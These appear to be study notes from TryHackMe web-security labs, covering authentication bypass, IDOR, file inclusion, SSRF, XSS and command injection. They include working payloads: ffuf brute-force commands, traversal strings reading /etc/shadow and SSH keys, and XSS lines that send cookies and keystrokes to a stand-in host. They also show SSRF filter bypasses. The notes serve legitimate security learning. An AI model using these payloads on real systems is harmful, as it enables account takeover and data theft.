# Vulnerability

## Authentication Bypass
### Username Enumeration
```
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.0/customers/signup -mr "username already exists"
```  
`-w` : usernamelist, `-X` : request method, `-d` : sending data, `FUZZ` : contents from wordlist, `-H` : additonal header, `-u` : target url, `-mr` : the text on the page we are looking for to validate we've found a valid username.  
`> valid_usernames.txt` : add the usernames that you found using ffuf.  

### Brute Force
Password Crack
```
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.0/customers/login -fc 200
.
.
.
:: Progress: [355/400] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error[Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder
```  

### Logic Flaw
A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.  
<img src="https://github.com/nkn-ctrl/pushtest/blob/main/vul_logicflaw.png" width="500">
```
user@tryhackme$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```  

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.  
The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data.  If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

### Cookie Tampering
- Plain Text
- Hashing
    https://crackstation.net/ keep databases of billions of hashes and their original strings.
- Encoding

## IDOR
IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.  
### Finding IDORs
- Encode IDs  
    The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot.  
    - https://www.base64decode.org/
    - https://www.base64encode.org/  

- Hashed IDs  
    Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value.  
    - https://crackstation.net/  

- Unpredictable IDs
    If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them.   

### Where are they located?
he vulnerable endpoint you're targeting may not always be something you see in the address bar.  
    - AJAX request  
    - JavaScript reference  
    - unregerenced parameter  (use during development)
    - as parameter mining

## File Inclusion
Local File Inclusion (LFI), Remote File Inclusion (RFI)  
### Path Traversal
Path traversal vulnerabilities occur when the user's input is passed to a function such as `file_get_contents` in PHP.  
> https://www.php.net/manual/en/function.file-get-contents.php  

Path traversal attacks, also known as the dot-dot-slash attack, then the attacker may send something as `http://webapp.thm/get.php?file=../../../../etc/passwd`  

<p align="center">
  <img src="https://user-images.githubusercontent.com/73976100/219909591-89db95e2-864f-4160-a3be-f95dcbdbe579.png" width="500"/>
</p>

|Location	|Description|
|:---------:|-----------|
|`/etc/issue`|contains a message or system identification to be printed before the login prompt.|
|`/etc/profile`|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|`/proc/version`|specifies the version of the Linux kernel|
|`/etc/passwd`|has all registered user that has access to a system|
|`/etc/shadow`|contains information about the system's users' passwords|
|`/root`/.bash_history|contains the history commands for `root` user|
|`/var/log/dmessage`|contains global system messages, including the messages that are logged during system startup|
|`/var/mail/root`|all emails for `root` user|
|`/root/.ssh/id_rsa`|Private SSH keys for a root or any known valid user on the server|
|`/var/log/apache2/access.log`|the accessed requests for `Apache`  webserver|
|`C:\boot.ini`|contains the boot options for computers with BIOS firmware|

### Local File Inclusion
LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications.  
- `http://webapp.thm/get.php?file=/etc/passwd`   
- `http://webapp.thm/get.php?file=../../../../etc/passwd`
- `http://webapp.thm/get.php?file=../../../../etc/passwd%00`  
    Using null bytes such as `%00` or `0x00` is an injection technique which the web app into disregarding whatever comes after the Null Byte..    
    NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.  
- `http://webapp.thm/get.php?file=../../../../etc/passwd/.`  
- `....//....//....//....//....//etc/passwd`  
    The web application replaces the `../` with the empty string.  
- ` ?lang=languages/../../../../../etc/passwd`  
    the web application asks to supply input that has to include a directory such as `languages`    

### Remote File Inclusion
Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application.  One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.   

<img src="https://user-images.githubusercontent.com/73976100/219932115-8c9dfbfc-bb9e-46ba-8d74-feb24ecfbc00.png" width="700">  
<br>

RFI steps  
1.  the attacker injects the malicious URL, which points to the attacker's server, such as `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`.  
    ```
    $ cat cmd.txt
    <?php
    print exec('hostname');
    ?>

    $ python3 -m http.server
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    ```
2. The web app server will send a `GET` request to the malicious server to fetch the file.
3. The web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.  

## SSRF
SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.  
1. The attacker can modify the area in red to an URL of their choice.   
    <p align="center">
    <img src="https://user-images.githubusercontent.com/73976100/220030798-fcc0111c-5a86-44b9-8058-13c9e6859400.png" width="500">
    </p>    
2. An attacker can still reach the /api/user page with only having control over the path by utilising directory traversal.  
    <p align="center">
    <img src="https://user-images.githubusercontent.com/73976100/220030808-afefc890-82bb-42b9-9641-86daaefa1abe.png" width="500">
    </p>    
3. The attacker can control the server's subdomain to which the request is made. Take note of the payload ending in &x= being used to stop the remaining path.  
    <p align="center">
    <img src="https://user-images.githubusercontent.com/73976100/220030812-0084942f-87d7-4469-8f27-4f3d1fce56a0.png" width="500">
    </p>    
4. Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice.   
    <p align="center">
    <img src="https://user-images.githubusercontent.com/73976100/220030815-0ed30e01-bd18-4790-9e01-8344cac296c8.png" width="500">
    </p>

### Finding an SSRF
- When a full URL is used in a parameter in the address bar:    
    ![vuln_ssrf01](https://user-images.githubusercontent.com/73976100/220021784-4a5aa01d-8f9f-46fe-a346-45cf125f1f19.png)
- A hidden field in a form:  
    ![vuln_ssrf02](https://user-images.githubusercontent.com/73976100/220021781-5eff37be-4cdc-467e-947a-732bf9859d3e.png)   
- A partial URL such as just the hostname:  
    ![vuln_ssrf03](https://user-images.githubusercontent.com/73976100/220021780-284dfc47-81dc-4a1e-ad33-a727306c82c9.png)
- Or perhaps only the path of the URL:  
    ![vuln_ssrf04](https://user-images.githubusercontent.com/73976100/220021776-77d02346-9068-409a-a05e-083c1533a653.png)

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as [requestbin.com](https://requestbin.com/), your own HTTP server or Burp Suite's Collaborator client.

### Defeating Common SSRF Defenses
- Deny List  
    - A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern such as `localhost` and `127.0.0.1` would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as `0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`, `2130706433`, `017700000001` or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as `127.0.0.1.nip.io`.
    - In a cloud environment,  it would be beneficial to block access to the IP address `169.254.169.254`, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.  
- Allow List  
    An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with `https://website.thm`. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as `https://website.thm.attackers-domain.thm`. The application logic would now allow this input and let an attacker control the internal HTTP request.  
- Open Redirect  
     An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.  


## Cross-site Scripting
Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.     

### XSS Payloads
- Proof Of Concept: `<script>alert('XSS');</script>`
- Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`   
- Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- Business Logic: For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:`<script>user.changeEmail('attacker@hacker.thm');</script>`     

### Reflected XSS
<p align="center">
<img src="https://user-images.githubusercontent.com/73976100/220097862-41ea6bab-b739-4145-8cc9-f8d8b8980b47.png" width="500">
</p>

How to test for Reflected XSS:
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

### Stored XSS
<p align="center">
<img src="https://user-images.githubusercontent.com/73976100/220099137-f7d12855-be8f-4be4-aaf1-56f7390b1733.png" width="600">
</p>  

How to test for Stored XSS:
- Comments on a blog
- User profile information
- Website Listings

### DOM based XSS
DOM stands for [Document Object Model](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html) and is a programming interface for HTML and XML documents.  
<p align="center">
<img src="https://user-images.githubusercontent.com/73976100/220102897-3151d000-8368-48b7-83cd-d79da6cd2827.png" width="400">
</p>

**Exploiting the DOM**  
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.    

**How to test for Dom Based XSS:**      
DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as `window.location.x` parameters.       

### Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.  
<br>

`</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>`  
- The `</textarea>` tag closes the textarea field. 
- The `<script>` tag opens open an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `{URL_OR_IP}` is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
- `?cookie=` is the query string that will contain the victim's cookies.
- `btoa()` command base64 encodes the victim's cookies.
- `document.cookie` accesses the victim's cookies for the Acme IT Support Website.
- `</script>` closes the JavaScript code block.

**How to test for Blind XSS:**  
When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.  
A popular tool for Blind XSS attacks is [xsshunter](https://xsshunter.com/). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.  

### Polyglots:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### PayloadAlltheThings
[PayloadAlltheThings-XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)  


## Command Injection
A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell).   
### Discovering Command Injection
<img src="https://user-images.githubusercontent.com/73976100/220255535-49831ac8-b3de-41af-bf1d-f64c11aa024b.png" width="800">  

1. The application stores MP3 files in a directory contained on the operating system.
2. The user inputs the song title they wish to search for. The application stores this input into the `$title` variable.
3. The data within this `$title` variable is passed to the command `grep` to search a text file named songtitle.txt for the entry of whatever the user wishes to search for.
4. The output of this search of songtitle.txt will determine whether the application informs the user that the song exists or not.

### Exploiting Command Injection
Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators `;`, `&` and `&&` will combine two (or more) system commands and execute them both.  
Command Injection can be detected in mostly one of two ways:  
|method|Descriotion|
|:----:|:----------|
|Blind|NO direct output. You will have to investigate the behaviours of the application.|
|Verbose|Direct feedback. For example, running the `whoami` command and The web application will output the username on the page directly.|  
<br>

**Detecting Blind Command Injection**  
- The `ping` and `sleep` commands are significant payloads to test with. Using `ping`, the application will hang for x seconds in relation to how many pings you have specified.
- Execute `whoami` command and redirect `>` that to a file. We can then use a command such as `cat` to read this newly created file’s contents.
- The `curl` command can deliver data.  
    `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`
<br>

**Useful payloads**  
- Linux  
    `whoami`, `ls`, `ping`, `sleep`, `nc`  
- Windows  
    `whoami`, `dir`, `ping`  
    `timeout`: This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed.  

### PayloadAlltheThings
[PayloadAlltheThings-command_injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)  

### Payload Box
[command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)  


## SQL Injection
SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. 
### What is SQL?
- SELECT　　
    `select * from users;`  
    |id|username|password|
    |:----|:----|:----|
    |1|jon|pass123|
    |2|admin|p4ssword|
    |3|martin|secret123|　　
    
    `select username,password from users;`  



